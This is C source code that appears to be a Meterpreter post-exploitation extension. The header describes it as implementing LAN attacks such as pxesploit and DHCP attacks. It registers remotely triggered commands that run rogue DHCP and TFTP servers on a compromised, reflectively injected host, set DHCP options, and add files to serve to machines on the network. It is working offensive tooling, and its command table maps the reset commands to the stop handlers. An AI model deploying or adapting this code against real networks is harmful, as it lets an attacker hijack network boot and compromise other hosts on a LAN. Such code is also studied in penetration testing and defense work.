/*
 * This module implements LAN attacks, like pxesploit and DHCP attacks 
 */
#define _CRT_SECURE_NO_DEPRECATE 1
#include "../../common/common.h"
#include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/ReflectiveLoader.c"
#include <windows.h>
#include "lanattacks.h"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

void* dhcpserver = NULL; //global DHCP server pointer
void* tftpserver = NULL; //global TFTP server pointer

//Launches the DHCP server
DWORD request_lanattacks_start_dhcp(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);

	int res = startDHCPServer(dhcpserver);

	packet_transmit_response(res, remote, response);
	
	return ERROR_SUCCESS;
}

//Reset the DHCP server
DWORD request_lanattacks_reset_dhcp(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);

	destroyDHCPServer(dhcpserver);
	dhcpserver = createDHCPServer();

	packet_transmit_response(ERROR_SUCCESS, remote, response);
	
	return ERROR_SUCCESS;
}
//Set a DHCP option based on the name and value specified in the packet
DWORD request_lanattacks_set_dhcp_option(Remote *remote, Packet *packet){
	DWORD retval = ERROR_SUCCESS;
	char* name = NULL;
	unsigned int namelen = 0;
	Packet *response = packet_create_response(packet);

	do{
		//Get option value
		Tlv tlv;
		if((retval = packet_get_tlv(packet, TLV_TYPE_LANATTACKS_OPTION, &tlv)) != ERROR_SUCCESS)
			break;
		//Get option name
		name = packet_get_tlv_value_string(packet, TLV_TYPE_LANATTACKS_OPTION_NAME);
		namelen = strlen(name);
		setDHCPOption(dhcpserver, name, namelen, tlv.buffer, tlv.header.length);
	} while (0);

	packet_transmit_response(retval, remote, response);
	return ERROR_SUCCESS;
}

//Turns off the DHCP server
DWORD request_lanattacks_stop_dhcp(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);

	int res = stopDHCPServer(dhcpserver);

	packet_transmit_response(res, remote, response);

	return ERROR_SUCCESS;
}
//Gets and resets the DHCP log
DWORD request_lanattacks_dhcp_log(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);

	unsigned long loglen;
	unsigned char * log = getDHCPLog(dhcpserver, &loglen);

	packet_add_tlv_raw(response, TLV_TYPE_LANATTACKS_RAW, log, loglen);
	packet_transmit_response(ERROR_SUCCESS, remote, response);
	free(log);

	return ERROR_SUCCESS;
}

//Launches the TFTP server
DWORD request_lanattacks_start_tftp(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);

	int res = startTFTPServer(tftpserver);

	packet_transmit_response(res, remote, response);
	
	return ERROR_SUCCESS;
}

//Reset the TFTP server
DWORD request_lanattacks_reset_tftp(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);

	destroyTFTPServer(tftpserver);
	tftpserver = createTFTPServer();

	packet_transmit_response(ERROR_SUCCESS, remote, response);
	
	return ERROR_SUCCESS;
}

//Adds a file to serve based on the name and value specified in the packet
DWORD request_lanattacks_add_tftp_file(Remote *remote, Packet *packet){
	DWORD retval = ERROR_SUCCESS;
	char* name = NULL;
	unsigned int namelen = 0;
	Packet *response = packet_create_response(packet);

	do{
		Tlv tlv;
		//Get file contents
		if((retval = packet_get_tlv(packet, TLV_TYPE_LANATTACKS_RAW, &tlv)) != ERROR_SUCCESS)
			break;
		//Get file name
		name = packet_get_tlv_value_string(packet, TLV_TYPE_LANATTACKS_OPTION_NAME);
		namelen = strlen(name);
		addTFTPFile(tftpserver, name, namelen, tlv.buffer, tlv.header.length);
	} while (0);

	packet_transmit_response(retval, remote, response);
	return ERROR_SUCCESS;
}

//Turns off the TFTP server
DWORD request_lanattacks_stop_tftp(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);

	int res = stopTFTPServer(tftpserver);

	packet_transmit_response(res, remote, response);
	
	return ERROR_SUCCESS;
}
Command customCommands[] =
{
	// Launch DHCP server
	{ "lanattacks_start_dhcp",
	  { request_lanattacks_start_dhcp, { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER },
	},

	// Reset DHCP
	{ "lanattacks_reset_dhcp",
	  { request_lanattacks_stop_dhcp, { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER },
	},

	// Set DHCP Option
	{ "lanattacks_set_dhcp_option",
	  { request_lanattacks_set_dhcp_option, { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER },
	},

	// Stop DHCP
	{ "lanattacks_stop_dhcp",
	  { request_lanattacks_stop_dhcp, { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER },
	},

	// Get DHCP Log
	{ "lanattacks_dhcp_log",
	  { request_lanattacks_dhcp_log, { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER },
	},

	// Launch TFTP server
	{ "lanattacks_start_tftp",
	  { request_lanattacks_start_tftp, { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER },
	},

	// Reset TFTP
	{ "lanattacks_reset_tftp",
	  { request_lanattacks_stop_tftp, { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER },
	},

	// Add TFTP file
	{ "lanattacks_add_tftp_file",
	  { request_lanattacks_add_tftp_file, { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER },
	},

	// Stop TFTP
	{ "lanattacks_stop_tftp",
	  { request_lanattacks_stop_tftp, { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER },
	},

	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER },
	  { EMPTY_DISPATCH_HANDLER },
	},
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote){
	DWORD index;

	hMetSrv = remote->hMetSrv;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	dhcpserver = createDHCPServer();
	tftpserver = createTFTPServer();

	if(tftpserver)
		return ERROR_SUCCESS;
	else
		return ERROR_NOT_ENOUGH_MEMORY;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	destroyDHCPServer(dhcpserver);
	dhcpserver = NULL;
	destroyTFTPServer(tftpserver);
	tftpserver = NULL;

	return ERROR_SUCCESS;
}
